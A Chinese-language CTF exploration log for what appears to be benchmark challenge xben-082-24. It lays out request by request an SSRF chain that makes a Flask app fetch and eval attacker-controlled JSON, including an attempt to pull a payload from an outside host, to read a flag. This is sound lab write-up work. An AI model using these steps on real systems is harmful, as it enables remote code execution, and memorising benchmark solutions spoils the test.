# xben-082-24 · 探索记录

对应题解：[`xben-082-24.md`](./xben-082-24.md)

## 目标与起点

`10.0.172.217` 的 `:80`（dashboard）与 `:8081`（flask_api），另有 `:8080`（flask_app）。
首页说明目标是「在 flask_app 容器执行命令并读 `/FLAG.txt`」。

## 第一阶段：摸清三个组件

- `:8081/` → `Welcome to the sample Flask microservice!, check out /script and /healthcheck`
- `:8081/script` → `{"script": "'OK ' * 4"}`
- `:8080/healthcheck` → `OK`；`:8080/app` → 渲染 `OK OK OK OK`
- `:80` 是 dashboard，`/api/get` 返回当前 API URL，`/name/get` 返回当前 hostname

## 第二阶段：确认 eval 链条

| 操作 | 结果 |
| --- | --- |
| 直接 `GET :8080/app` | `OK OK OK OK`（= `'OK ' * 4` 求值） |
| `GET :80/api/set?url=http://10.254.1.70:8899/evil4` 后 `GET :8080/app` | 500 `Network is unreachable` |

判据：flask_app 确实去拉了 URL（有连接尝试），只是容器内网到不了 VPN 网段。

## 第三阶段：用 `/name/get` 托管 payload

| 操作 | 结果 |
| --- | --- |
| `GET /name/set?name={"script":"6*7"}` → `/name/get` | 原样返回 `{"script":"6*7"}`（裸文本，无转义） |
| `GET /api/set?url=http://nginx:80/name/get` | `API URL set to: ...` |
| `GET :8080/app` | 200，`<div class="result">flag{...}</div>` |

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 用本机 `python3 -m http.server` 托管 payload | 500 `Network is unreachable` | 容器内网无法回连 VPN 地址 |
| `/app/`、`/app/script`（经 `:80` 的 `/app` 前缀） | 404 | nginx 的 `/app` location 转发的是 `/app`，flask_app 只挂了 `/app` 与 `/healthcheck`（直接访问 `:8080/app` 才 200） |
| `/name/set` 里写 `\x27` 转义的单引号 | eval 失败（语法错误） | 存进去的是字面 `\x27`，需直接写 `'` |
| 把 name 设成裸 Python 表达式（不带 JSON） | 不生效 | `/app` 期望 JSON，取 `.script` 字段 |

## 这次真正的收获

1. **「写入 + 原样回显」的接口 = 内网 payload 托管**，比向外网回连可靠得多。
2. **SSRF 失败时先看错误类型。** `Network is unreachable` 是网络不可达（选错目标），
   `Connection refused`/`getaddrinfo` 才可能是服务不存在。
3. **读 Hosts 表**：容器里能用的主机名写在页面上，不要用宿主/VPN 的地址。
